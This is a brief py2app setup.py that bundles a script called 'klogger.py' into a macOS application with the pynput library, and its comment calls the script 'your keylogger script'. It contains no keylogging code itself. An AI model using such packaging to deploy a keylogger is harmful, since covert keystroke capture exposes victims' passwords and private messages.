from setuptools import setup

APP = ['klogger.py']  # Replace 'your_script.py' with the name of your keylogger script
OPTIONS = {
    'argv_emulation': True,
    'packages': ['pynput'],
}

setup(
    app=APP,
    options={'py2app': OPTIONS},
    setup_requires=['py2app'],
)
